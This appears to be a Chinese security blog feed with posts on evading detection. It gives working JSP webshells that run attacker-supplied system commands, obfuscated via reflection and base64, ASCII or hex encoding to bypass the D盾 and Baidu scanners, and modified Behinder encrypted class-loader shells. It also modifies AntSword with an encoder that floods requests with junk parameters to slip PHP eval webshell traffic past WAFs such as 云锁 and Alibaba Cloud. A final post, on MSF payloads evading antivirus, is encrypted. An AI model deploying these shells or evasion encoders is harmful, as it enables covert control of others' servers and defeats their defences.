&#125;&#125;运行后成功调用计算器。我们用类加载的方式成功执行了系统命令。对命令执行JSP一句话免杀JAVA执行系统命令的核心就是Runtime.getRuntime().exec(cmd)原型12345678910&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b,0,a)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;经过二分法分析，发现特征码是在Runtime.getRuntime().exec这一句。不知道什么是二分法分析的看我以前的两篇webshell免杀文章。然后发现D盾对于JSP中只要有exec就会报一级。那么我们就可以利用类反射的方法来隐藏掉exec函数。类反射绕过1234567891011121314151617package test;import java.lang.reflect.Method;import java.util.Scanner;public class Test &#123; public static void main(String[] args) throws Exception &#123; String op = &quot;&quot;; Class rt = Class.forName(&quot;java.lang.Runtime&quot;); //加载Runtime类 Method gr = rt.getMethod(&quot;getRuntime&quot;); //获取getRuntime方法 Method ex = rt.getMethod(&quot;exec&quot;, String.class); //获取exec方法 Process e = (Process) ex.invoke(gr.invoke(null), &quot;cmd /c whoami&quot;); //invoke 传参调用 //以下代码是获取输出结果 Scanner sc = new Scanner(e.getInputStream()).useDelimiter(&quot;\\A&quot;); op = sc.hasNext() ? sc.next() : op; sc.close(); System.out.print(op); &#125;&#125;可以看到成功执行了whoami命令那么接下来就是把他放到jsp里面。利用base64编码123456789101112131415161718192021&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; BASE64Decoder decoder = new BASE64Decoder(); Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;))); Process e = (Process) rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;可以bypass D盾跟百度scanner，下面的都是免杀的，就不截图了。利用ASCII编码1234567891011&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;)); Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;利用HEX编码1234567891011&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; import=&quot;javax.xml.bind.DatatypeConverter&quot; language=&quot;java&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123; Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary(&quot;6a6176612e6c616e672e52756e74696d65&quot;))); Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary(&quot;65786563&quot;)), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary(&quot;67657452756e74696d65&quot;))).invoke(null), request.getParameter(&quot;cmd&quot;) ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;寻找其他类java中与执行命令相关的主要有两个类12java.lang.Runtimejava.lang.ProcessBuilder我们上文中反射了Runtime类，那么同样我们也可以反射ProcessBuilder类。原理是相同的，此处不再具体举例实现。对于冰蝎JSP一句话的免杀冰蝎JSP一句话的实现是我最佩服的一点，也是我今后想要加入到蚁剑中的功能。由于冰蝎中改写的是Object类，所以几乎全部都是非敏感函数。目前各大杀软查杀的规则也并不是特别完善，其实特别容易免杀。免杀D盾经过二分法查找特征码，D盾对于冰蝎的查杀规则是这一句1new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);为了简洁冰蝎作者把很多东西都写到一行里了。那么我们就把其中的变量拆出来试试。把base64解密那一块给抠出来，实例化给decoder变量。123456789&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));BASE64Decoder decoder=new sun.misc.BASE64Decoder();new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;就已经可以过D盾了经过测试随便拆其他的也可以，再拆一个uploadString123456789&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;)); String uploadString= request.getReader().readLine();new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;也可以免杀免杀百度scanner拆最后一句免杀不了scanner经过测试scanner识别冰蝎的特征在这一句1c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));那就再把这一句给拆了12345678910&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);SecretKeySpec sec=new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;); c.init(2,sec); String uploadString= request.getReader().readLine();new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;这时候就可以两个都免杀了最后其实还有很多方式值得去探索，就比如命令执行一句话那里。我们可以在shell里只放类加载函数，而不含具体的payload。然后写一个命令类，类里接收一个String类型的参数，作为所要执行的cmd语句。然后把它编译成二进制class，通过GET型或者POST型传过去。其中cmd参数也从GET传入，经过shell发送到命令执行类中，就相当于实现了php中形如http://test.com/shell.php?func=system&amp;cmd=whoami 的回调函数后门。其中有一个师傅已经实现了菜刀的远程加载类，文章地址：http://p2j.cn/?p=1627不过所有的jar包都放在作者的博客上，也就是说每个shell都会先访问他的博客，还是建议自己搭建。套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之增加垃圾数据]]></title>
    <url>%2Fposts%2Fantsword-diy-1%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。正文思路简介大家都知道垃圾数据填充可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤，大家常常把这种方法叫做缓冲区溢出。原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，只不过要稍加修改。因为实际测试过程中发现，仅仅在payload前面加上超长字符串对于某里云来说并没有卵用，似乎已经免疫。但是换了个思路，发现改成增加大量垃圾键值对之后就可以bypass，那就暂且把这种方法叫做增加垃圾数据绕过法吧。这篇文章主要介绍这种方法，以及如何把这个功能移植到蚁剑上。编码器实现这篇文章本来是几个月前发在自己的星球里，名字叫做蚁剑编码器之流量混淆。当时想着怎么方便怎么来，所以采用的是最简单、改动最小的一种实现方式–编码器实现。这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。12345678910111213141516171819let varname_min = 5; //变量名最小长度 let varname_max = 15; // 变量名最大长度 let data_min = 200; // 变量值最小长度 let data_max = 250; // 变量值最大长度 let num_min = 150; // 变量最小个数 let num_max = 250; // 变量最大个数 function randomString(length) &#123; // 生成随机字符串 //let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; function randomInt(min, max) &#123; //生成指定范围内的随机数 return parseInt(Math.random() * (max - min + 1) + min, 10); &#125; for (let i = 0; i &lt; randomInt(num_min, num_max); i++) &#123; //将混淆流量放入到payload数组中 data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); &#125;那么怎么用呢很简单，就直接把这段代码放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例123456789101112131415161718192021222324252627282930&apos;use strict&apos;;/*code by yzddMr6*/module.exports = (pwd, data, ext = &#123;&#125;) =&gt; &#123; let varname_min = 5; let varname_max = 15; let data_min = 200; let data_max = 250; let num_min = 100; let num_max = 200; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); function randomString(length) &#123; //let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; function randomInt(min, max) &#123; return parseInt(Math.random() * (max - min + 1) + min, 10); &#125; for (let i = 0; i &lt; randomInt(num_min, num_max); i++) &#123; data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); &#125; data[pwd] = `@eval(base64_decode($_POST[$&#123;randomID&#125;]));`; delete data[&apos;_&apos;]; return data;&#125;过云锁测试本来想用安全狗，结果发现好像免费版不能拦截一句话。那就用云锁开刀吧。首先在虚拟机里放个一句话，就用某辣鸡项目生成的可以正常运行然后使用蚁剑默认的base64编码器连接试一下云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击然后使用我们上面的流量混淆编码器shell正常连接，成功bypass云锁。过阿里云测试这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。众所周知阿里云是以封IP著名，一言不合就全网ban你。不仅站x不了，甚至很多其他网站都打不开。。。反正要到期了，码也懒得打了。首先用backdoor study搭建个环境这时候要找一个免杀马放上去，不然的话连接之前就被阿里云ban了然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了这时候换上加了垃圾数据污染后的编码器正常执行命令写文件测试bypass阿里云蚁剑核心功能实现理论上这种方法不管是asp php aspx jsp都可以用到，如果按照编码器实现的话就要建立四个编码器，觉得还是加入到核心功能中比较好。这几天看了一下蚁剑的架构，感叹于设计者思路的精妙。首先我们可以看看他modules目录下的request模块的内容可以看到两个if else 语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 监听HTTP请求 * @param &#123;Object&#125; event ipcMain事件对象 * @param &#123;Object&#125; opts 请求配置 * @return &#123;[type]&#125; [description] */ onRequest(event, opts) &#123; logger.debug(&apos;onRequest::opts&apos;, opts); if (opts[&apos;url&apos;].match(CONF.urlblacklist)) &#123; return event .sender .send(&apos;request-error-&apos; + opts[&apos;hash&apos;], &quot;Blacklist URL&quot;); &#125; let _request = superagent.post(opts[&apos;url&apos;]); // 设置headers _request.set(&apos;User-Agent&apos;, USER_AGENT); // 自定义headers for (let _ in opts.headers) &#123; _request.set(_, opts.headers[_]); &#125; // 自定义body const _postData = Object.assign(&#123;&#125;, opts.body, opts.data); if (opts[&apos;useChunk&apos;] == 1) &#123; logger.debug(&quot;request with Chunked&quot;); let _postarr = []; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1); &#125;); // 后续可能需要二次处理的在这里追加 _postarr.push(`$&#123;key&#125;=$&#123;_tmp&#125;`); &#125; &#125; let antstream = new AntRead(_postarr.join(&quot;&amp;&quot;), &#123; &apos;step&apos;: parseInt(opts[&apos;chunkStepMin&apos;]), &apos;stepmax&apos;: parseInt(opts[&apos;chunkStepMax&apos;]) &#125;); xxxxxxx &#125; else &#123; // 通过替换函数方式来实现发包方式切换, 后续可改成别的 const old_send = _request.send; let _postarr = []; if (opts[&apos;useMultipart&apos;] == 1) &#123; _request.send = _request.field; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = (_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1) &#125;); _postarr[key] = _tmp; &#125; &#125; &#125; else &#123; _request.send = old_send; for (var key in _postData) &#123; if (_postData.hasOwnProperty(key)) &#123; let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) &#123; return unescape($1) &#125;); // 后续可能需要二次处理的在这里追加 _postarr.push(`$&#123;key&#125;=$&#123;_tmp&#125;`); &#125; &#125; _postarr = _postarr.join(&apos;&amp;&apos;); &#125;大概就是说如果开启了chunk传输后不拉不拉，否则的话就看看是否开启了Multipart，如果开启了不拉不拉，否则咕叽咕叽。主要的payload是以字典的形式放到_postData中，然后字典键跟值用=连接后放到_postarr数组中，最后再把_postarr数组用&amp;连接起来就是我们最终发包的payload了。那么这里也就是我们要下手修改的地方，照葫芦画瓢，再增加一个else语句因为我这里都改好了，就直接截图说要改哪些点吧。1opts`为在界面中选择的选项，这里起个名字叫`addMassData然后要到source/core/base.js中增加你的配置选项，注意的是蚁剑把普通请求跟下载请求的发包是分开的，所以需要改两处，自己vscode搜一下改一下。123456789101112131415161718192021// 发送请求数据 .send(&apos;request&apos;, &#123; url: this.__opts__[&apos;url&apos;], hash: hash, data: opt[&apos;data&apos;], tag_s: opt[&apos;tag_s&apos;], tag_e: opt[&apos;tag_e&apos;], encode: this.__opts__[&apos;encode&apos;], ignoreHTTPS: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;ignore-https&apos;] === 1, useChunk: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-chunk&apos;] === 1, chunkStepMin: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;chunk-step-byte-min&apos;] || 2, chunkStepMax: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;chunk-step-byte-max&apos;] || 3, useMultipart: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-multipart&apos;] === 1, addMassData: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;add-MassData&apos;] === 1, useRandomVariable: (this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;use-random-variable&apos;] === 1, timeout: parseInt((this.__opts__[&apos;otherConf&apos;] || &#123;&#125;)[&apos;request-timeout&apos;]), headers: (this.__opts__[&apos;httpConf&apos;] || &#123;&#125;)[&apos;headers&apos;] || &#123;&#125;, body: (this.__opts__[&apos;httpConf&apos;] || &#123;&#125;)[&apos;body&apos;] || &#123;&#125; &#125;); &#125;) &#125;后端改完之后要改前端了，前端修改内容是在source\modules\shellmanager\list\form.js中存放增加一个checkbox，注意label名字不要写错。然后改语言文件，这个没什么好说的。全部改完之后重启蚁剑(注意是把软件x掉重新双击打开，否则某些改动不会更新)，设置中就可以看到我们新增加的增加垃圾数据选项了选中后发包测试一下可以看到已经成功啦 一半接着发现一个奇怪的问题，每次payload都是在第一个这样肯定是不行的，所以我们还需要写一个随机函数，让字典随机排序没有现成的函数，随手搓一个附上辣鸡代码123456789101112function randomDict(dic)&#123; let tmparray=[] for(let i in dic)&#123; tmparray.push(i) &#125; tmparray=tmparray.sort((a, b)=&gt; &#123; return Math.random() &gt; 0.5 ? -1 : 1; &#125;) let finaldata=&#123;&#125; tmparray.forEach(i =&gt; &#123; finaldata[i]=dic[i]&#125;);return finaldata&#125;然后出现了点小插曲因为_postData是const类型，不能直接修改既然追求刺激，那就贯彻到底啦，直接改成let再试一下就可以实现字典随机排序了发现还可以正常使用，改了就改了吧asp测试aspx测试asp,aspx类型的shell都可以正常使用最后参数个数可以根据实际情况自行修改，不过一般也不需要改，所以就没有写到UI中。把参数个数改大可能会绕过更多waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(三)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-3%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! 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